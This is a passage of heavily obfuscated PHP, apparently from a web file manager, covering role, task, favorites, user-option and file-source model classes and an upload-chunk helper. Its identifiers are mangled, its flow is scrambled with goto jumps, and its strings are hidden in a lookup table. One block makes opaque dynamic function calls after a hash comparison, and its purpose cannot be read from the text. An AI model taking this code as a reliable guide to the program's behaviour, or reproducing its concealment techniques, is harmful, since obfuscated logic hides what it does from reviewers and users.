$Aä¤àÚÈÏÎ)) { return !1; } } } return $Aä¤àÚÈÏÎ; } private function writeTo($e´¨Ì¶ÔÛ, $AĞÓ…–Ñîš, $cÉ‘‰ŒÌ¡³) { goto Fô­É‚ò†›; Eó§¤ëÚæˆ: $aºñí”’„Õ = @fopen($e´¨Ì¶ÔÛ, $D¿Œåëê®™[1517]); if (!$aºñí”’„Õ || !$AĞÓ…–Ñîš || !$C¤Œ±¶ËÈŒ) { CacheLock::unlock($f¶Æ¦®ÙË˜); return !1; } while (!feof($aºñí”’„Õ)) { fwrite($AĞÓ…–Ñîš, fread($aºñí”’„Õ, 1024 * 200)); } goto eŒàÑŠ¸Ëª; eŒàÑŠ¸Ëª: fclose($aºñí”’„Õ); fclose($AĞÓ…–Ñîš); CacheLock::unlock($f¶Æ¦®ÙË˜); goto fºÚöÙÅÇ®; Fô­É‚ò†›: $D¿Œåëê®™ =& $_SERVER[í…¶]; $f¶Æ¦®ÙË˜ = $D¿Œåëê®™[1987] . $cÉ‘‰ŒÌ¡³; $C¤Œ±¶ËÈŒ = CacheLock::lock($f¶Æ¦®ÙË˜, 1); goto Eó§¤ëÚæˆ; fºÚöÙÅÇ®: return !0; goto a›Ÿª¸”·Š; a›Ÿª¸”·Š: } private function statusGet() { goto AÜ–¹²­çí; AÜ–¹²­çí: $dÑ°Ä‚«Îå =& $_SERVER[í…¶]; if (is_array($this->statusData)) { return $this->statusData; } $CØÚ³º¤—¢ = $this->tempFile . $dÑ°Ä‚«Îå[1988]; goto FÜøáñáºğ; FÜøáñáºğ: $FîĞå¿¦ß = !1; if (file_exists($CØÚ³º¤—¢)) { $FîĞå¿¦ß = @file_get_contents($CØÚ³º¤—¢); } if ($FîĞå¿¦ß) { $this->statusData = json_decode($FîĞå¿¦ß, !0); } goto fò³¬ÏÉóÎ; fò³¬ÏÉóÎ: if (!$this->statusData) { $cˆ›±Å†Ğ = array($dÑ°Ä‚«Îå[28] => $this->fileName, $dÑ°Ä‚«Îå[1975] => 0, $dÑ°Ä‚«Îå[1976] => array()); $this->statusSet($cˆ›±Å†Ğ); } return $this->statusData; goto EÂŞ¿ƒ¶íØ; EÂŞ¿ƒ¶íØ: } public function statusSet($a“ªÎùÒ‰·) { $cè«¯ßˆùé = $this->tempFile . $_SERVER[í…¶][1988]; if (!$a“ªÎùÒ‰·) { if (file_exists($cè«¯ßˆùé)) { @unlink($cè«¯ßˆùé); } return !0; } $this->statusData = $a“ªÎùÒ‰·; return file_put_contents($cè«¯ßˆùé, json_encode($a“ªÎùÒ‰·)); } private function initFileTemp() { $Cöæ©—æ• =& $_SERVER[í…¶]; if (file_exists($this->tempFile)) { return; } $E¼Ş×ˆ”Ø¤ = fopen($this->tempFile, $Cöæ©—æ•[1989]); fseek($E¼Ş×ˆ”Ø¤, $this->in[$Cöæ©—æ•[77]] - 1, SEEK_SET); fwrite($E¼Ş×ˆ”Ø¤, $Cöæ©—æ•[477]); fclose($E¼Ş×ˆ”Ø¤); } public function checkChunk() { goto B¾±ÌÃ½Ë–; B¾±ÌÃ½Ë–: $dÂ¶Åš˜™ =& $_SERVER[í…¶]; $Cùñ…ë„É = array(); CacheLock::lock($this->tempFile); goto fÌºäÃ—‚; EÌ×Ò† œø: return $Cùñ…ë„É; goto A»¯¯ÄïÍŠ; fÌºäÃ—‚: $eì´Šİ¸„ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($eì´Šİ¸„[$dÂ¶Åš˜™[1976]] as $D¥©£Àõ½Ü) { $dºˆ««¡«º = $D¥©£Àõ½Ü[$dÂ¶Åš˜™[164]]; if ($dºˆ««¡«º) { $Cùñ…ë„É[$dÂ¶Åš˜™[1990] . $D¥©£Àõ½Ü[$dÂ¶Åš˜™[1034]]] = $dºˆ««¡«º; } } goto EÌ×Ò† œø; A»¯¯ÄïÍŠ: } private function checkChunkHash($d¨‰„”Œ») { goto CìÀ¡›àÓÑ; CìÀ¡›àÓÑ: $Dò™¦ó– =& $_SERVER[í…¶]; if (count($d¨‰„”Œ»[$Dò™¦ó–[1976]]) != $d¨‰„”Œ»[$Dò™¦ó–[1975]]) { return !1; } $fÀÌùåÈ“ = _get($this->in, $Dò™¦ó–[1983]); goto EÛÉ ÌÉ·; eÀğø†šñÉ: return $CèÇƒŠÈ²³; goto b÷ãÏõ° Ÿ; A·ßíçÀ®’: $CèÇƒŠÈ²³ = !0; foreach ($d¨‰„”Œ»[$Dò™¦ó–[1976]] as $E‰İêë»‚˜) { fseek($e»®ø¼áŞë, $E‰İêë»‚˜[$Dò™¦ó–[1978]]); $eÆ£®šÚèƒ = PathDriverStream::hash($e»®ø¼áŞë, $E‰İêë»‚˜[$Dò™¦ó–[77]]); if ($E‰İêë»‚˜[$Dò™¦ó–[164]] != $eÆ£®šÚèƒ) { $CèÇƒŠÈ²³ = !1; break; } } fclose($e»®ø¼áŞë); goto eÀğø†šñÉ; EÛÉ ÌÉ·: $b±£ëŸÂ‰÷ = _get($this->in, $Dò™¦ó–[1991]); if (strlen($b±£ëŸÂ‰÷) == 32 && IO::hashSimple($this->tempFile) == $fÀÌùåÈ“ && IO::hashMd5($this->tempFile) == $b±£ëŸÂ‰÷) { return !0; } $e»®ø¼áŞë = fopen($this->tempFile, $Dò™¦ó–[1168]); goto A·ßíçÀ®’; b÷ãÏõ° Ÿ: } public static function fileName() { goto EÄŠæ¯¬µß; aè£†­Û‘: if (!empty($_FILES)) { $dœêÍêØ½á = $dœêÍêØ½á ? $dœêÍêØ½á : $_FILES[$bÓÕ¶…¬…×[167]][$bÓÕ¶…¬…×[395]]; } if (!is_wap()) { return KodIO::clear($dœêÍêØ½á); } $e¢§¾Ê°„Ï = strtotime($in[$bÓÕ¶…¬…×[1992]]); goto Dµ¶Æ÷ò·; Dµ¶Æ÷ò·: $e¢§¾Ê°„Ï = $e¢§¾Ê°„Ï ? $e¢§¾Ê°„Ï : time(); $F¼ãÑˆÔÄ­ = strtolower($dœêÍêØ½á); if ($F¼ãÑˆÔÄ­ == $bÓÕ¶…¬…×[1993] || $F¼ãÑˆÔÄ­ == $bÓÕ¶…¬…×[1994]) { $dœêÍêØ½á = date($bÓÕ¶…¬…×[692], $e¢§¾Ê°„Ï) . $bÓÕ¶…¬…×[70] . $in[$bÓÕ¶…¬…×[77]] . $bÓÕ¶…¬…×[1625]; } else { if ($F¼ãÑˆÔÄ­ == $bÓÕ¶…¬…×[1995]) { $dœêÍêØ½á = date($bÓÕ¶…¬…×[692], $e¢§¾Ê°„Ï) . $bÓÕ¶…¬…×[70] . $in[$bÓÕ¶…¬…×[77]] . $bÓÕ¶…¬…×[1996]; } } goto AÆ»á‰ÆÓ¤; EÄŠæ¯¬µß: $bÓÕ¶…¬…× =& $_SERVER[í…¶]; global $in; $dœêÍêØ½á = isset($in[$bÓÕ¶…¬…×[28]]) ? $in[$bÓÕ¶…¬…×[28]] : $bÓÕ¶…¬…×[33]; goto aè£†­Û‘; AÆ»á‰ÆÓ¤: return KodIO::clear($dœêÍêØ½á); goto FÖÚÙ‘‘¶‡; FÖÚÙ‘‘¶‡: } private function errorInfo($Eï†öãÎ˜£) { $fÜÌÃ˜µÔç =& $_SERVER[í…¶]; $cë»İØÚè‰ = array($fÜÌÃ˜µÔç[1997], $fÜÌÃ˜µÔç[1998], $fÜÌÃ˜µÔç[1999], $fÜÌÃ˜µÔç[2000], $fÜÌÃ˜µÔç[2001], $fÜÌÃ˜µÔç[2002], $fÜÌÃ˜µÔç[2003], $fÜÌÃ˜µÔç[2004]); return $Eï†öãÎ˜£ . $fÜÌÃ˜µÔç[4] . $cë»İØÚè‰[$Eï†öãÎ˜£]; } } goto f¤³Ôƒá®…; bìÙãÎ¨¨: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\x2e\162\x6f\154\145\114\151\x73\x74"; public $field = array("\156\x61\x6d\x65", "\x61\x75\x74\150", "\x6c\141\142\x65\154", "\x64\x69\163\x70\154\141\171", "\163\171\163\164\145\155", "\x64\x65\163\x63", "\151\147\156\157\x72\x65\105\x78\164", "\151\x67\x6e\x6f\162\x65\x46\151\154\x65\123\x69\x7a\x65", "\141\144\155\151\156\151\x73\164\x72\x61\x74\157\x72", "\x73\x6f\x72\x74"); public function listData($cÊ„ùê‡Ç = false, $DÁëŠ¥ãìï = "\x73\157\x72\164", $f‡•Ÿõ«Âî = false) { $d¾õĞ·¼·É =& $_SERVER[í…¶]; $a™í¶Ñ²Ë† = parent::listData($cÊ„ùê‡Ç, $DÁëŠ¥ãìï, $f‡•Ÿõ«Âî); if (!$cÊ„ùê‡Ç) { $aÂ‘›˜Ã§ = $d¾õĞ·¼·É[2480]; foreach ($a™í¶Ñ²Ë† as $bÕÕã˜øÛ  => $e“›ÒÂğƒ) { if ($e“›ÒÂğƒ[$d¾õĞ·¼·É[2481]] == 1) { $a™í¶Ñ²Ë†[$bÕÕã˜øÛ ][$d¾õĞ·¼·É[414]] = $aÂ‘›˜Ã§; } } } return $a™í¶Ñ²Ë†; } public function update($fë±öŒ”õ, $C–˜ë»¯) { goto CõÌŸŠÈˆ; EçÆ˜ÇàÜ: if (!$d¹³‘Òîòå || $cµº‰®íå && $cµº‰®íå[$f‘ç­ÍÌò[376]] != $d¹³‘Òîòå[$f‘ç­ÍÌò[376]]) { return !1; } if ($cµº‰®íå[$f‘ç­ÍÌò[2481]] == 1) { $C–˜ë»¯ = array($f‘ç­ÍÌò[28] => $C–˜ë»¯[$f‘ç­ÍÌò[28]], $f‘ç­ÍÌò[2119] => $C–˜ë»¯[$f‘ç­ÍÌò[2119]]); } $this->filterAuth($C–˜ë»¯[$f‘ç­ÍÌò[385]]); goto EİĞ™ÎŒ¶å; EİĞ™ÎŒ¶å: return parent::update($fë±öŒ”õ, $C–˜ë»¯); goto a¿Â½÷ï´í; CõÌŸŠÈˆ: $f‘ç­ÍÌò =& $_SERVER[í…¶]; $d¹³‘Òîòå = parent::listData($fë±öŒ”õ); $cµº‰®íå = $this->findByName($C–˜ë»¯[$f‘ç­ÍÌò[28]]); goto EçÆ˜ÇàÜ; a¿Â½÷ï´í: } public function remove($fÇ½õØÃµ¸) { $AŸìø¹Ô®ƒ = parent::listData($fÇ½õØÃµ¸); if (!$AŸìø¹Ô®ƒ || $AŸìø¹Ô®ƒ[$_SERVER[í…¶][1078]]) { return !1; } return parent::remove($fÇ½õØÃµ¸); } public function add($F­ô…ÙöÎ) { goto D•ŞÉå•; aº¼Ÿì†¼¢: return parent::insert($F­ô…ÙöÎ); goto Eçë…Õ·ÙË; D•ŞÉå•: $BÒõƒÏìÂñ =& $_SERVER[í…¶]; $E—»—®½Ò„ = $F­ô…ÙöÎ[$BÒõƒÏìÂñ[28]]; if ($this->findByName($E—»—®½Ò„)) { return !1; } goto f·Î÷Â§; f·Î÷Â§: $a„²Ëçò = array($BÒõƒÏìÂñ[395] => $E—»—®½Ò„, $BÒõƒÏìÂñ[2107] => $BÒõƒÏìÂñ[33], $BÒõƒÏìÂñ[2103] => $BÒõƒÏìÂñ[2120], $BÒõƒÏìÂñ[2482] => 1, $BÒõƒÏìÂñ[2106] => 0, $BÒõƒÏìÂñ[2483] => 0, $BÒõƒÏìÂñ[2105] => $this->getSort()); $F­ô…ÙöÎ = array_merge($a„²Ëçò, $F­ô…ÙöÎ); $this->filterAuth($F­ô…ÙöÎ[$BÒõƒÏìÂñ[385]]); goto aº¼Ÿì†¼¢; Eçë…Õ·ÙË: } private function getSort() { $cŠŠÏóÏÑƒ =& $_SERVER[í…¶]; $Bš÷ÕóˆÁ” = parent::listData(); $A÷ØĞÕçÙ = array_to_keyvalue($Bš÷ÕóˆÁ”, $cŠŠÏóÏÑƒ[33], $cŠŠÏóÏÑƒ[2122]); return empty($A÷ØĞÕçÙ) ? 0 : max($A÷ØĞÕçÙ) + 1; } private function filterAuth(&$Dµ°–ŒæŠ) { $AÈœ–×Ù³ó =& $_SERVER[í…¶]; $AÚ†—â‡Ê = array(); $EŠ¡¦½Ó¿ = array_filter(explode($AÈœ–×Ù³ó[47], $Dµ°–ŒæŠ)); foreach ($EŠ¡¦½Ó¿ as $Dµ°–ŒæŠ) { $C›±‡¸°‘Á = explode($AÈœ–×Ù³ó[91], $Dµ°–ŒæŠ); if ($C›±‡¸°‘Á[0] == $AÈœ–×Ù³ó[1780] && $C›±‡¸°‘Á[1] != $AÈœ–×Ù³ó[1034]) { $bæØÚ¾é¤Ó = $C›±‡¸°‘Á[0] . $AÈœ–×Ù³ó[91] . $C›±‡¸°‘Á[1] . $AÈœ–×Ù³ó[2484]; if (!in_array($bæØÚ¾é¤Ó, $EŠ¡¦½Ó¿)) { $AÚ†—â‡Ê[] = $bæØÚ¾é¤Ó; } } $AÚ†—â‡Ê[] = $Dµ°–ŒæŠ; } $Dµ°–ŒæŠ = implode($AÈœ–×Ù³ó[47], $AÚ†—â‡Ê); } public function sort($Ağ’™Úé›ç, $DŒŠÅÎØ¤„) { return parent::update($Ağ’™Úé›ç, $DŒŠÅÎØ¤„); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\56\164\141\x73\153\x4c\151\x73\x74"; public $field = array("\156\x61\155\145", "\164\171\x70\x65", "\145\166\x65\x6e\x74", "\164\151\x6d\x65", "\144\145\x73\143", "\x73\171\163\x74\145\x6d", "\145\x6e\x61\142\154\x65", "\154\141\163\164\x52\165\x6e", "\163\x6f\162\x74"); public function listData($d²Ş’ßäê = false, $CÛ–¾Û„Í‹ = "\163\157\162\x74", $D˜”äÇ÷Ì = false) { return parent::listData($d²Ş’ßäê, $CÛ–¾Û„Í‹, $D˜”äÇ÷Ì); } public function add($b×Š¶ÕôË÷) { $DÑË¡±ŒØÀ =& $_SERVER[í…¶]; $DçšöÙò¬ï = $this->findByName($b×Š¶ÕôË÷[$DÑË¡±ŒØÀ[28]]); if ($DçšöÙò¬ï) { return !1; } $b×Š¶ÕôË÷[$DÑË¡±ŒØÀ[1398]] = 0; $b×Š¶ÕôË÷[$DÑË¡±ŒØÀ[2122]] = $this->getSort(); return parent::insert($b×Š¶ÕôË÷); } private function getSort() { $bùÓ¡´˜ø† =& $_SERVER[í…¶]; $fĞ£÷Ù›§‚ = parent::listData(); $fª‚Á³¸¡§ = array_to_keyvalue($fĞ£÷Ù›§‚, $bùÓ¡´˜ø†[33], $bùÓ¡´˜ø†[2122]); return empty($fª‚Á³¸¡§) ? 0 : max($fª‚Á³¸¡§) + 1; } public function update($cß¶Òßè˜‘, $eä…œ¾ƒ··) { $eà­©ÓÎèÅ =& $_SERVER[í…¶]; $E±šÒÖİ”¨ = $this->listData($cß¶Òßè˜‘); $eÒ£µ³Áõö = $this->findByName($eä…œ¾ƒ··[$eà­©ÓÎèÅ[28]]); if (!$E±šÒÖİ”¨ || $eÒ£µ³Áõö && $eÒ£µ³Áõö[$eà­©ÓÎèÅ[376]] != $E±šÒÖİ”¨[$eà­©ÓÎèÅ[376]]) { return !1; } return parent::update($cß¶Òßè˜‘, $eä…œ¾ƒ··); } public function remove($EÒ¾ƒ‹Øø , $F¦ˆ·‡ÖËÀ = false) { $dáÃí™› =& $_SERVER[í…¶]; $e×õç†ÂÙŒ = $this->listData($EÒ¾ƒ‹Øø ); if (!$e×õç†ÂÙŒ) { return; } if (!$F¦ˆ·‡ÖËÀ && $e×õç†ÂÙŒ[$dáÃí™›[1078]] == $dáÃí™›[83]) { return !1; } return parent::remove($EÒ¾ƒ‹Øø ); } public function enable($D»’Ùº¦Ò, $a¥½µ„õ‹Â) { return $this->update($D»’Ùº¦Ò, array($_SERVER[í…¶][2474] => $a¥½µ„õ‹Â)); } public function run($C·õŞ¡¹ÉÁ) { return $this->update($C·õŞ¡¹ÉÁ, array($_SERVER[í…¶][2485] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\x5f\x66\141\166"; protected function cacheFunctionAlias($AÛàµ¾”ßë) { $A²áÅ‘Ô÷ñ =& $_SERVER[í…¶]; return array($A²áÅ‘Ô÷ñ[2486] => array(USER_ID, $A²áÅ‘Ô÷ñ[2487])); } protected function listData() { $d¦Ñ±’´¸­ =& $_SERVER[í…¶]; $EÒÎ™âß´ = array($d¦Ñ±’´¸­[1424] => USER_ID, $d¦Ñ±’´¸­[445] => 0); $a†ĞÂí¤â® = $d¦Ñ±’´¸­[2488]; $FİÎ«Á’ = $this->field($a†ĞÂí¤â®)->where($EÒÎ™âß´)->order($d¦Ñ±’´¸­[2489])->select(); return $FİÎ«Á’ ? $FİÎ«Á’ : array(); } protected function resetCache() { } protected function listView() { goto Eµˆ¡Æ–ïÇ; Eµˆ¡Æ–ïÇ: $añæÒ‹Œ¡š =& $_SERVER[í…¶]; $AßŠçîØ‹÷ = $this->listData(); $dØö­Œ£¥× = array_filter_by_field($AßŠçîØ‹÷, $añæÒ‹Œ¡š[29], $añæÒ‹Œ¡š[391]); goto bå„©Öì²Â; A‚¨ì»æë²: $BˆØà¼âƒò = array($añæÒ‹Œ¡š[392] => array($añæÒ‹Œ¡š[393], $EàÕ‰ëõ‚)); $d‡×Äñóø” = Model($añæÒ‹Œ¡š[755])->listSource($BˆØà¼âƒò, $fĞÍóâÕˆ•); $d‡×Äñóø” = array_merge($d‡×Äñóø”[$añæÒ‹Œ¡š[73]], $d‡×Äñóø”[$añæÒ‹Œ¡š[74]]); goto A«¦‘›â‡Ö; bå„©Öì²Â: $EàÕ‰ëõ‚ = array_to_keyvalue($dØö­Œ£¥×, $añæÒ‹Œ¡š[33], $añæÒ‹Œ¡š[75]); if (!$EàÕ‰ëõ‚) { return $AßŠçîØ‹÷; } $fĞÍóâÕˆ• = 2000; goto A‚¨ì»æë²; A«¦‘›â‡Ö: $d‡×Äñóø” = array_to_keyvalue($d‡×Äñóø”, $añæÒ‹Œ¡š[378]); foreach ($AßŠçîØ‹÷ as $bšÜºØŸ™– => $d²¦¡¨‚Ê) { $BÊÊé½ìñÅ = $d‡×Äñóø”[$d²¦¡¨‚Ê[$añæÒ‹Œ¡š[75]]]; $BÊÊé½ìñÅ = $BÊÊé½ìñÅ ? $BÊÊé½ìñÅ : array(); $AßŠçîØ‹÷[$bšÜºØŸ™–] = array_merge($BÊÊé½ìñÅ, $d²¦¡¨‚Ê); } return $AßŠçîØ‹÷; goto d“´øêê—±; d“´øêê—±: } protected function addFav($Cê‡ôºªƒÌ, $a‚Ãáƒ¼¥¿ = '', $d„«éæ™œä = "\x73\x6f\x75\162\x63\145") { goto A¸«¦ƒÂ¦; B¾æ’ÛÈµ: $E±ïï¦Èê = array($aÉê×¶‹—ª[1424] => USER_ID, $aÉê×¶‹—ª[445] => 0); $A—†ª„¢­º = $this->where($E±ïï¦Èê)->max($aÉê×¶‹—ª[2122]); if (!$A—†ª„¢­º) { $A—†ª„¢­º = 0; } goto fÅ¡‚¤½¦; A¸«¦ƒÂ¦: $aÉê×¶‹—ª =& $_SERVER[í…¶]; $E±ïï¦Èê = array($aÉê×¶‹—ª[1424] => USER_ID, $aÉê×¶‹—ª[445] => 0, $aÉê×¶‹—ª[397] => $d„«éæ™œä, $aÉê×¶‹—ª[396] => $Cê‡ôºªƒÌ); if ($this->where($E±ïï¦Èê)->find()) { return !1; } goto B¾æ’ÛÈµ; fÅ¡‚¤½¦: if (!$a‚Ãáƒ¼¥¿ && $d„«éæ™œä == $aÉê×¶‹—ª[391]) { $FÈŞæÒ· = Model($aÉê×¶‹—ª[1115])->where(array($aÉê×¶‹—ª[392] => $Cê‡ôºªƒÌ))->find(); if (!$FÈŞæÒ·) { return !1; } $a‚Ãáƒ¼¥¿ = $FÈŞæÒ·[$aÉê×¶‹—ª[28]]; } $a‚Ãáƒ¼¥¿ = $this->getAutoName($a‚Ãáƒ¼¥¿); $CÏ®É¾  = array($aÉê×¶‹—ª[1424] => USER_ID, $aÉê×¶‹—ª[445] => 0, $aÉê×¶‹—ª[395] => $a‚Ãáƒ¼¥¿, $aÉê×¶‹—ª[396] => $Cê‡ôºªƒÌ, $aÉê×¶‹—ª[397] => $d„«éæ™œä, $aÉê×¶‹—ª[2105] => $A—†ª„¢­º + 1); goto f¸–ß±ÛÂ‰; f¸–ß±ÛÂ‰: return $this->add($CÏ®É¾ ); goto cùİîôã·; cùİîôã·: } protected function remove($AãÙ¢ğ¤ñ) { $aÖ–ğ±ÊÄ‹ =& $_SERVER[í…¶]; $C•èÕóÇ¡É = array($aÖ–ğ±ÊÄ‹[1424] => USER_ID, $aÖ–ğ±ÊÄ‹[394] => $AãÙ¢ğ¤ñ); return $this->where($C•èÕóÇ¡É)->delete(); } protected function removeByName($cìœå—Ùï¬) { $C‹…›Ù›¥­ =& $_SERVER[í…¶]; $eŠ˜×İœØé = array($C‹…›Ù›¥­[1424] => USER_ID, $C‹…›Ù›¥­[395] => $cìœå—Ùï¬, $C‹…›Ù›¥­[445] => 0); return $this->where($eŠ˜×İœØé)->delete(); } protected function rename($aÓ÷‰¥Ş¤, $a…¯ğ‹ÒÒ) { $cÒø×Ô™Âñ =& $_SERVER[í…¶]; if ($aÓ÷‰¥Ş¤ == $a…¯ğ‹ÒÒ) { return !1; } $dªßÉÊç¤— = $this->getAutoName($a…¯ğ‹ÒÒ); if ($a…¯ğ‹ÒÒ != $dªßÉÊç¤—) { return !1; } $eÜä¸†º… = array($cÒø×Ô™Âñ[1424] => USER_ID, $cÒø×Ô™Âñ[445] => 0, $cÒø×Ô™Âñ[28] => $aÓ÷‰¥Ş¤); return $this->where($eÜä¸†º…)->save(array($cÒø×Ô™Âñ[28] => $a…¯ğ‹ÒÒ)); } protected function resetSort($eâÈİ¡³’) { $Aùò°‰Šğ¬ =& $_SERVER[í…¶]; $eâÈİ¡³’ = is_array($eâÈİ¡³’) ? $eâÈİ¡³’ : array(); $AÀŠÚ§æ›Ø = array($Aùò°‰Šğ¬[1424] => USER_ID); for ($Eå³È§§¡¿ = 0; $Eå³È§§¡¿ < count($eâÈİ¡³’); $Eå³È§§¡¿++) { $AÀŠÚ§æ›Ø[$Aùò°‰Šğ¬[394]] = $eâÈİ¡³’[$Eå³È§§¡¿]; $this->where($AÀŠÚ§æ›Ø)->save(array($Aùò°‰Šğ¬[2105] => $Eå³È§§¡¿ + 1)); } return !0; } protected function moveTop($cÙ÷‡æ­É) { goto BĞÏçãƒêï; AÅÙäƒ: $Cºë¶„ëÊ° = $BŸõ¿ÒÛ›; $BŸõ¿ÒÛ› = array_remove_value($BŸõ¿ÒÛ›, $Fâ”¢Ö¿ù[$B¸ÒàŸ†…ƒ[376]]); array_unshift($BŸõ¿ÒÛ›, $Fâ”¢Ö¿ù[$B¸ÒàŸ†…ƒ[376]]); goto AÜ§…°¼”; BĞÏçãƒêï: $B¸ÒàŸ†…ƒ =& $_SERVER[í…¶]; $D‡’¢ÇÔÊÆ = array($B¸ÒàŸ†…ƒ[1424] => USER_ID, $B¸ÒàŸ†…ƒ[445] => 0); $Fâ”¢Ö¿ù = $this->where($D‡’¢ÇÔÊÆ)->where(array($B¸ÒàŸ†…ƒ[28] => $cÙ÷‡æ­É))->find(); goto cÕùÏÇÌ§“; AÜ§…°¼”: return $this->resetSort($BŸõ¿ÒÛ›); goto E‡»’ğ»‘ó; cÕùÏÇÌ§“: if (!$Fâ”¢Ö¿ù) { return; } $BŸõ¿ÒÛ› = $this->field($B¸ÒàŸ†…ƒ[376])->where($D‡’¢ÇÔÊÆ)->order($B¸ÒàŸ†…ƒ[2489])->select(); $BŸõ¿ÒÛ› = array_to_keyvalue($BŸõ¿ÒÛ›, $B¸ÒàŸ†…ƒ[33], $B¸ÒàŸ†…ƒ[376]); goto AÅÙäƒ; E‡»’ğ»‘ó: } protected function moveBottom($B©×âïãõˆ) { $C¯äÎ«‰› =& $_SERVER[í…¶]; $Eè»¦Ú„Â = array($C¯äÎ«‰›[1424] => USER_ID, $C¯äÎ«‰›[445] => 0); $BÓÔæÕ„£è = $this->where($Eè»¦Ú„Â)->max($C¯äÎ«‰›[2122]); $cˆ‰Ïî = array($C¯äÎ«‰›[2122] => $BÓÔæÕ„£è + 1); return $this->where($Eè»¦Ú„Â)->where(array($C¯äÎ«‰›[28] => $B©×âïãõˆ))->save($cˆ‰Ïî); } private function getAutoName($DöÛéíÖ‰˜) { goto Cğ¤›×ííŠ; Cğ¤›×ííŠ: $eæ“öºáÖ³ =& $_SERVER[í…¶]; $D²¾­™µ‚Ò = array($eæ“öºáÖ³[1424] => USER_ID, $eæ“öºáÖ³[445] => 0); $bùãÖ‰®ŸÃ = $this->field($eæ“öºáÖ³[28])->where($D²¾­™µ‚Ò)->select(); goto Fœ°—Ó½áÛ; Fœ°—Ó½áÛ: $bùãÖ‰®ŸÃ = array_to_keyvalue($bùãÖ‰®ŸÃ, $eæ“öºáÖ³[33], $eæ“öºáÖ³[28]); if (!$bùãÖ‰®ŸÃ || !in_array($DöÛéíÖ‰˜, $bùãÖ‰®ŸÃ)) { return $DöÛéíÖ‰˜; } for ($e¼íŞÒÀ‰ = 0; $e¼íŞÒÀ‰ < count($bùãÖ‰®ŸÃ); $e¼íŞÒÀ‰++) { if (!in_array($DöÛéíÖ‰˜ . "\50{$e¼íŞÒÀ‰}\51", $bùãÖ‰®ŸÃ)) { return $DöÛéíÖ‰˜ . "\50{$e¼íŞÒÀ‰}\51"; } } goto FØ÷‡Æ³‰; FØ÷‡Æ³‰: return $DöÛéíÖ‰˜ . "\x28{$e¼íŞÒÀ‰}\51"; goto Dğƒå›¬; Dğƒå›¬: } } goto CÒµâÑ„¯œ; Cğ³‰Êàº—: $E±‡‘à˜ƒÒ = $_SERVER[í…¶][343]; if ($_SERVER[$_SERVER[í…¶][344]] != $E±‡‘à˜ƒÒ($dš—õİÍÏí)) { goto b¸ÆÚç‚¦®; Eµò‡¿äÓ: $dÛ¯…÷´‰İ = explode($_SERVER[í…¶][217], $E®›ˆ¤ò£); if (count($dÛ¯…÷´‰İ) < $_SERVER[í…¶][348]) { $bİƒîÇŒÙ× = $_SERVER[í…¶][349]; $bİƒîÇŒÙ×(); } $D…òÙò¢»à = $_SERVER[í…¶][350]; goto C”¥•ˆ—¬; b¸ÆÚç‚¦®: $FƒÏ¸„Ÿ¡ß = $_SERVER[í…¶][345]; $f’Åª¼ÔÏÍ = $_SERVER[$_SERVER[í…¶][346]] . $_SERVER[í…¶][347]; $E®›ˆ¤ò£ = $FƒÏ¸„Ÿ¡ß($f’Åª¼ÔÏÍ); goto Eµò‡¿äÓ; C”¥•ˆ—¬: $D…òÙò¢»à($dš—õİÍÏí); goto b……¶“Ì‚Ï; b……¶“Ì‚Ï: } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\162\x5f\157\160\164\x69\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($f¦ƒÀ›ê·²) { $FØ‡Êêø ¹ =& $_SERVER[í…¶]; if (!defined($FØ‡Êêø ¹[436])) { define($FØ‡Êêø ¹[436], 0); } return "\125\x73\145\x72\117\x70\164\151\x6f\x6e\x5f{$f¦ƒÀ›ê·²}\137" . USER_ID; } protected function filterWhere($a™ŸÛ³¤¾®) { $aæµÖµ¿ÉÉ =& $_SERVER[í…¶]; if (!defined($aæµÖµ¿ÉÉ[436])) { define($aæµÖµ¿ÉÉ[436], 0); } $a™ŸÛ³¤¾®[$aæµÖµ¿ÉÉ[1433]] = USER_ID; return $a™ŸÛ³¤¾®; } public function cacheRemoveUser($D×Ÿ‰‚ÕÏÃ, $f‚Å¾¤‹³Â) { return Cache::remove("\125\163\x65\x72\x4f\x70\x74\x69\157\x6e\137{$D×Ÿ‰‚ÕÏÃ}\137" . $f‚Å¾¤‹³Â); } protected function optionDefault($fë—ß³‡Ùñ = '') { $D´ØÒÖ…–ö =& $_SERVER[í…¶]; if ($fë—ß³‡Ùñ == $D´ØÒÖ…–ö[33]) { return $GLOBALS[$D´ØÒÖ…–ö[6]][$D´ØÒÖ…–ö[2539]]; } if ($fë—ß³‡Ùñ == $D´ØÒÖ…–ö[2540]) { return $GLOBALS[$D´ØÒÖ…–ö[6]][$D´ØÒÖ…–ö[2541]]; } } } goto EƒÖâ¦³‰; Cø¼ÁïÍâö: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\x75\x72\x63\145"; protected $tableMeta = array("\x74\141\142\154\x65\116\x61\x6d\x65" => "\x69\x6f\137\x73\157\x75\162\x63\145\x5f\155\x65\164\141", "\x6d\145\164\141\106\x69\145\154\144" => "\x73\157\165\x72\x63\145\x49\x44"); protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\x79\x54\x69\155\145", "\x74\151\155\145", "\151\x6e\163\x65\162\164", "\x66\165\x6e\x63\164\151\157\156"), array("\143\x72\145\x61\164\145\x54\x69\x6d\x65", "\x74\151\x6d\145", "\151\156\163\x65\162\164", "\146\x75\156\143\x74\x69\x6f\x6e"), array("\x76\x69\x65\x77\124\x69\x6d\145", "\x74\151\155\x65", "\x69\156\163\145\162\164", "\x66\x75\x6e\143\x74\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($dò¸…Ô™ã³) { return $this->listSource(array($_SERVER[í…¶][377] => $dò¸…Ô™ã³)); } public function typeName($A“œ“·°é) { static $bºÓËÖÎ‰Ä = array(self::TYPE_SYSTEM => "\x73\171\x73\164\x65\x6d", self::TYPE_USER => "\x75\163\x65\162", self::TYPE_GROUP => "\x67\162\x6f\x75\160"); return $bºÓËÖÎ‰Ä[$A“œ“·°é . $_SERVER[í…¶][33]]; } public function sourceListInfo($dÁƒô˜Û‘¯, 